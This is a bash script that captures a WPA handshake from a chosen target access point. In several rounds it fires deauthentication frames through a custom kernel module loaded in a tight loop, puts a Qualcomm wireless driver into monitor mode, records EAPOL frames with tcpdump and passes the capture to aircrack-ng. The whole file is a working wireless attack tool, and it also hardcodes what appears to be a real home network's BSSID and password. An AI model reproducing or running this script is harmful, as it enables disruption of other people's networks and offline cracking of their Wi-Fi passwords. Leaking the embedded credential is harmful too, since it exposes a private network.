#!/bin/bash
# grab_hs_v3.sh - Handshake capture via tight-loop deauth during association
#
# Strategy:
# 1. Start connecting to TARGET AP with wrong password (background)
# 2. Rapidly fire petx5 in tight loop to catch the brief PE session
# 3. When petx5 succeeds, deauth goes out on TARGET's channel
# 4. Switch to monitor mode, capture handshake
#
# Usage: grab_hs_v3.sh <TARGET_BSSID> <SSID> <CHANNEL> [ROUNDS]

TARGET_BSSID="$1"
TARGET_SSID="$2"
CH="$3"
ROUNDS="${4:-5}"
FREQ=$((2407 + CH * 5))
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PASS="9006609b29404a"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_SSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <TARGET_BSSID> <SSID> <CHANNEL> [ROUNDS]"
    exit 1
fi

echo "[*] Target: $TARGET_SSID ($TARGET_BSSID) ch$CH ($FREQ MHz)"
echo "[*] Rounds: $ROUNDS"
echo "[*] Strategy: tight-loop petx5 during target association"

[ -f /tmp/petx5.ko ] || { cd /tmp && as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

rm -f /tmp/hs_r*.pcap /tmp/hs_final.pcap
got_handshake=0

for r in $(seq 1 $ROUNDS); do
    echo ""
    echo "========== ROUND $r/$ROUNDS =========="

    # ===== PHASE 1: Associate + Deauth =====
    echo "[Phase 1] Connect to target + rapid deauth"

    # Clean state
    killall -9 wpa_supplicant 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    sleep 0.5
    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1.5

    # Load driver
    insmod $DRIVER
    sleep 4

    # Start NetworkManager
    systemctl start NetworkManager
    sleep 2

    # Start connecting to target (wrong password, will fail at EAPOL)
    nmcli device wifi connect "$TARGET_BSSID" password "dummypass_$(date +%s)" ifname wlan0 2>/dev/null &
    NM_PID=$!
    echo "[*] nmcli connect started (pid $NM_PID)"

    # Rapid-fire petx5 for 20 seconds — will catch PE session when association happens
    SENT=0
    for i in $(seq 1 200); do
        rmmod kfind 2>/dev/null
        insmod /tmp/petx5.ko 2>/dev/null
        RC=$?
        if [ $RC -eq 0 ]; then
            SENT=$((SENT + 1))
            echo "[+] DEAUTH #$SENT sent at iter $i"
            rmmod kfind 2>/dev/null
            # Send more in quick succession
            for extra in 1 2 3 4; do
                sleep 0.05
                rmmod kfind 2>/dev/null
                insmod /tmp/petx5.ko 2>/dev/null
                [ $? -eq 0 ] && SENT=$((SENT + 1))
                rmmod kfind 2>/dev/null
            done
            break
        fi
        rmmod kfind 2>/dev/null
        sleep 0.1
    done

    if [ $SENT -eq 0 ]; then
        echo "[!] Failed to send any deauths - no PE session caught"
        echo "[*] dmesg:"
        dmesg | grep -i "assoc.*8c.f0\|petx5\|deauth.*8c.f0\|connected.*8c.f0" | tail -5
        kill $NM_PID 2>/dev/null
        # Still try monitor capture in case clients reconnect naturally
    else
        echo "[+] Total deauths sent: $SENT"
        dmesg | grep "petx5:" | tail -3
    fi

    kill $NM_PID 2>/dev/null
    wait $NM_PID 2>/dev/null

    # ===== PHASE 2: Monitor + Capture =====
    echo "[Phase 2] Switch to monitor mode"

    systemctl stop NetworkManager 2>/dev/null
    killall -9 wpa_supplicant 2>/dev/null
    sleep 0.3

    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1
    insmod $DRIVER con_mode_monitor=4
    sleep 2.5
    ip link set wlan0 up
    iw dev wlan0 set freq $FREQ
    echo "[+] Monitor on $FREQ MHz"

    # Capture for 25 seconds
    CAPFILE="/tmp/hs_r${r}.pcap"
    timeout 25 tcpdump -i wlan0 -w "$CAPFILE" 'ether proto 0x888e or (type mgt subtype deauth) or (type mgt subtype assoc-resp)' 2>/dev/null
    SIZE=$(stat -c%s "$CAPFILE" 2>/dev/null || echo 0)
    echo "[+] Captured: $SIZE bytes"

    # Quick check with tshark/tcpdump
    EAPOL=$(tcpdump -r "$CAPFILE" -nn 2>/dev/null | grep -ci "EAPOL\|802.1X")
    echo "[*] EAPOL frames: $EAPOL"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!!!] EAPOL detected!"
        cp "$CAPFILE" /tmp/hs_final.pcap
        aircrack-ng /tmp/hs_final.pcap 2>&1 | head -15
        if aircrack-ng /tmp/hs_final.pcap 2>&1 | grep -qi "1 handshake"; then
            got_handshake=1
            echo "[!!!] HANDSHAKE CAPTURED!"
            break
        fi
    fi
done

echo ""
echo "========== RESULTS =========="
if ls /tmp/hs_r*.pcap >/dev/null 2>&1; then
    mergecap -w /tmp/hs_final.pcap /tmp/hs_r*.pcap 2>/dev/null
    [ -f /tmp/hs_final.pcap ] && aircrack-ng /tmp/hs_final.pcap 2>&1 | head -20
fi

[ $got_handshake -eq 1 ] && echo "[*] SUCCESS" || echo "[*] No handshake"

# Restore
echo "[*] Restoring WiFi..."
ip link set wlan0 down 2>/dev/null
rmmod wlan 2>/dev/null
sleep 2
insmod $DRIVER
sleep 4
systemctl start NetworkManager 2>/dev/null
sleep 2
nmcli device wifi connect $HOME_BSSID password $HOME_PASS ifname wlan0 2>/dev/null
echo "[*] Done"
